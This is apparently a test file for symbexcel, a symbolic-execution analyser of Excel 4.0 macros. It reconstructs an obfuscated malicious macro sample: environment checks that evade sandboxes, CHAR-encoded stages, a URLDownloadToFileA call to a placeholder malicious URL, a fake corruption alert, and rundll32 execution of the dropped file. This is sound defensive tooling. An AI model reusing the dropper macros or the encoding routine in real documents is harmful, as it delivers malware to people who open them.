#!/usr/bin/env python3

import IPython

from symbexcel import SimulationManager

if __package__:
    from . import common
else:
    import common


# SEE https://blogs.vmware.com/networkvirtualization/2020/10/evolution-of-excel-4-0-macro-weaponization-continued.html/
def test_cluster13():
    cells = {
        'A1': (None, '=LEN(APP.MAXIMIZE())+722'),
        'A2': (None, '=LEN(GET.WINDOW(7))+797'),
        'A3': (None, '=LEN(GET.WINDOW(20))+-337'),
        'A4': (None, '=LEN(GET.WINDOW(23)=3)+-996'),
        'A5': (None, '=LEN(GET.WORKSPACE(31))+731'),
        'A6': (None, '=LEN(GET.WORKSPACE(13)>770)+-549'),
        'A7': (None, '=LEN(GET.WORKSPACE(14)>390)+-149'),
        'A8': (None, '=LEN(GET.WORKSPACE(19))+-129'),
        'A9': (None, '=LEN(GET.WORKSPACE(42))+-132'),
        'A10': (None, '=GOTO(C1)')
    }

    # assume all true: key=A1:A9
    key = [726, 801, -333, -992, 735, -545, -145, -125, -128]
    keylen = len(key)
    payload = ['=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://somemalicious.url/fdsa","c:\\Users\\Public\\target.file",0,0)',
               '=ALERT("The workbook cannot be opened or repaired by Microsoft Excel because it\'s corrupt.",2)',
               '=CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open","C:\\Windows\\system32\\rundll32.exe","c:\\Users\\Public\\target.file,DllRegisterServer",0,5)',
               '=CLOSE(FALSE)']

    first_stage_c = 'E'
    first_stage_r = 1
    for i, macro in enumerate(payload):
        concat_string = '&'.join(f'CHAR(A{j%keylen + 1}+{ord(c)-key[j%keylen]})' for j, c in enumerate(macro))
        cells[f'C{i+1}'] = (None, f'=FORMULA({concat_string}, {first_stage_c}{first_stage_r+i})')

    cells[f'C{len(payload)+1}'] = (None, f'=GOTO({first_stage_c}{first_stage_r})')

    excel_doc = common.get_excel_doc(cells)
    simgr = SimulationManager(excel_doc=excel_doc)

    # cheat
    # simgr.one_active.environment['window'][7] = True
    # simgr.one_active.environment['window'][20] = True
    # simgr.one_active.environment['window'][23] = 3
    # simgr.one_active.environment['workspace'][31] = True
    # simgr.one_active.environment['workspace'][13] = 771
    # simgr.one_active.environment['workspace'][14] = 391
    # simgr.one_active.environment['workspace'][19] = True
    # simgr.one_active.environment['workspace'][42] = True

    simgr.run(find=lambda s: s.address in common.BREAKPOINTS)

    assert len([s for s in simgr.deadended if s.error]) == 3
    assert len([s for s in simgr.deadended if not s.error]) == 1
    assert simgr.deadended[-1].formula == '=CLOSE(FALSE)'

    if common.INTERACTIVE:
        IPython.embed()


def main():
    test_cluster13()


if __name__ == '__main__':
    common.parse_args()
    main()
